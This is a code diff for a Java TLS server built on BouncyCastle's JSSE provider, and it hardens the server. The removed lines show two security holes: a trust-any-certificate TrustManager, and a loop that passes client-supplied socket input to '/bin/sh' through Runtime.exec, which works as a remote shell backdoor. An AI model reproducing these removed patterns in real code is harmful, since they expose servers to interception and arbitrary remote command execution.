@@ -8,7 +8,6 @@ import java.io.*;
 import java.net.Socket;
 import java.security.*;
 import java.security.cert.CertificateException;
-import java.security.cert.X509Certificate;
 import java.util.Arrays;
 import java.util.Optional;
 
@@ -33,28 +32,12 @@ public class TlsServer {
         // get default from most prioritized securtiy provider -> BCJSSE
         SSLContext sslCtx = SSLContext.getInstance("TLS", "BCJSSE");
 
-        // initialize sslContext with a KeyManager and dummy TrustManager
+        // initialize sslContext with a KeyManager and no TrustManager
         KeyStore ks = KeyStore.getInstance("PKCS12");
         ks.load(new FileInputStream(keystore), keystorePwd.toCharArray());
         KeyManagerFactory kmf = KeyManagerFactory.getInstance("SunX509");
         kmf.init(ks, keystorePwd.toCharArray());
-        TrustManager tm = new X509TrustManager() {
-            @Override
-            public void checkClientTrusted(X509Certificate[] x509Certificates, String s) throws CertificateException {
-                // Trust any client
-            }
-
-            @Override
-            public void checkServerTrusted(X509Certificate[] x509Certificates, String s) throws CertificateException {
-                // Trust any  server
-            }
-
-            @Override
-            public X509Certificate[] getAcceptedIssuers() {
-                return null;
-            }
-        };
-        sslCtx.init(kmf.getKeyManagers(), new TrustManager[]{tm}, null);
+        sslCtx.init(kmf.getKeyManagers(), null, null);
 
         // verify correct selection
         if(DEBUG) {
@@ -119,8 +102,7 @@ public class TlsServer {
                 BufferedReader in = new BufferedReader(new InputStreamReader(sock.getInputStream()));
                 BufferedWriter out = new BufferedWriter(new OutputStreamWriter(sock.getOutputStream()));
                 while (in.readLine() != null) {
-                    Runtime r = Runtime.getRuntime();
-                    r.exec("/bin/sh " + in.readLine());
+                    out.write("ack");
                     out.flush();
                 }
             } catch (Exception e) {
